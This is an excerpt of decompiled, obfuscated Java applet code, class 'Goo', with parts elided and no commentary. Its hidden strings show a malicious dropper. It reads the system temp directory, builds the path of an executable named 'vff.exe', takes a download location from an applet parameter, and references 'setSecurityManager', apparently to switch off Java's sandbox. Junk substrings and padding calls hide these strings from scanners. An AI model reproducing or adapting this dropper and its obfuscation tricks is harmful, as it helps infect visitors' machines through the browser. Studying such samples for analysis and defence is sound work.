...
public class Goo extends Applet
{
    ...
    public void start() {
        ...
        try {
            this.mopmg();
            String lmopaa = System.getProperty("jakgnownva.ikgnowno.tkgnownmpdkgnownir".replace("kgnown", ""));
            this.mopmg();
            if (lmopaa.charAt(lmopaa.length() - 1) != '\\') {
                lmopaa += "\\";
            }
            this.mopmg();
            final String coopl = lmopaa + "vfkgnownf.exkgnowne".replace("kgnown", "");
            this.mopmg();
            this.mopmg();
            final String poiuhgfr = this.getParameter("dekn0wdsst".replace("kn0wds", ""));
            this.mopmg();
            String dpoiuhgfr = "";
            this.mopmg();
    ...
    public Goo() {
        ...
        this.npkng();
        final String kjhgfd = "sng1djdetng1djdSecurng1djdityMang1djdnang1djdger".replace("ng1djd", "");
        this.npkng();
